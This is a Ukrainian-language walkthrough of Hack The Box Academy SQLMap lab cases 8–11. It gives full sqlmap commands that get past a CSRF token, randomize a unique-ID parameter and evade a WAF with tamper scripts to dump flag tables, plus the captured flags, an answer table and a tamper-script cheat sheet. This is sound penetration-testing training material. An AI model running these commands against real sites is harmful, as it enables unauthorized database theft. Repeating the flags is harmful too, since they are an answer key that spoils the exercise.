# SQLMap — Anti-CSRF, Unique ID, Tamper Scripts

## Модуль
[SQLMap Essentials — Handling Anti-CSRF & Special Cases](https://academy.hackthebox.com/app/module/58/section/530)

---

## Case 8 — Anti-CSRF Token (non-standard name)

**Проблема:** форма має hidden поле `t0ken` (не стандартний `csrf_token`).
sqlmap повинен автоматично оновлювати токен перед кожним запитом.

```bash
sqlmap -u "http://TARGET/case8.php" \
  --data="id=1&t0ken=PLACEHOLDER" \
  --csrf-token="t0ken" \
  --batch --dump -T flag8 -D testdb
```

> `--csrf-token="t0ken"` — вказати нестандартну назву CSRF поля.
> sqlmap автоматично робить GET запит, витягує актуальний токен і підставляє його.

**Flag:** `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

---

## Case 9 — Unique ID (рандомний параметр)

**Проблема:** параметр `uid` змінюється при кожному запиті — сервер
відхиляє запити зі старим `uid`.

```bash
sqlmap -u "http://TARGET/case9.php?id=1&uid=4014551158" \
  --randomize=uid \
  --batch --dump -T flag9 -D testdb --threads=5
```

> `--randomize=uid` — генерувати випадкове значення для `uid` в кожному запиті.

**Flag:** `HTB{700_much_r4nd0mn355_f0r_my_74573}`

---

## Case 10 — WAF Bypass (Tamper Scripts + request file)

**Проблема:** POST запит фільтрується WAF — стандартні payloads блокуються.
Рішення: комбінація tamper скриптів через `-r` (request file).

```bash
# Зберегти HTTP запит у файл
cat > /tmp/case10.txt << 'EOF'
POST /case10.php HTTP/1.1
Host: TARGET:PORT
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

id=1
EOF

sqlmap -r /tmp/case10.txt \
  --tamper=between,randomcase,space2comment \
  --batch --dump -T flag10 -D testdb
```

> Tamper комбінація:
> - `between` — замінює `>` на `BETWEEN`
> - `randomcase` — `SeLeCt` замість `SELECT`
> - `space2comment` — пробіли → `/**/`

**Flag:** `HTB{y37_4n07h3r_r4nd0m1z3}`

---

## Case 11 — WAF Bypass (GET + Tamper)

```bash
sqlmap -u "http://TARGET/case11.php?id=1" \
  --tamper=between,randomcase \
  --batch --dump -T flag11 -D testdb --threads=5
```

**Flag:** `HTB{5p3c14l_ch4r5_n0_m0r3}`

---

## Відповіді

| Q | Case | Техніка | Flag |
|---|------|---------|------|
| Q1 | Case 8 | Anti-CSRF `--csrf-token` | `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}` |
| Q2 | Case 9 | Unique ID `--randomize` | `HTB{700_much_r4nd0mn355_f0r_my_74573}` |
| Q3 | Case 10 | WAF Bypass `-r` + tamper | `HTB{y37_4n07h3r_r4nd0m1z3}` |
| Q4 | Case 11 | WAF Bypass tamper | `HTB{5p3c14l_ch4r5_n0_m0r3}` |

---

## Tamper Scripts — шпаргалка

| Script | Що робить | Коли використовувати |
|--------|-----------|---------------------|
| `space2comment` | пробіли → `/**/` | фільтр пробілів |
| `between` | `>` → `BETWEEN x AND y` | фільтр операторів порівняння |
| `randomcase` | `SeLeCt` | case-sensitive WAF |
| `base64encode` | base64 всього payload | encoding фільтри |
| `charencode` | URL encode символів | URL фільтри |
| `charunicodeencode` | Unicode encode | Unicode фільтри |
| `equaltolike` | `=` → `LIKE` | фільтр `=` |
| `greatest` | `>` → `GREATEST()` | фільтр `>` |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL)` | функціональні фільтри |

```bash
# Комбінувати через кому
--tamper=space2comment,randomcase,between

# Список всіх tamper скриптів
ls /usr/share/sqlmap/tamper/
```

## Спеціальні параметри для захищених форм

```bash
--csrf-token="token_name"   # CSRF token (будь-яка назва)
--csrf-url="URL"            # URL для отримання токену (якщо інший)
--randomize="param"         # рандомізувати параметр
--eval="import random; uid=random.randint(1,9999999999)"  # Python eval
-r request.txt              # Burp request file
```
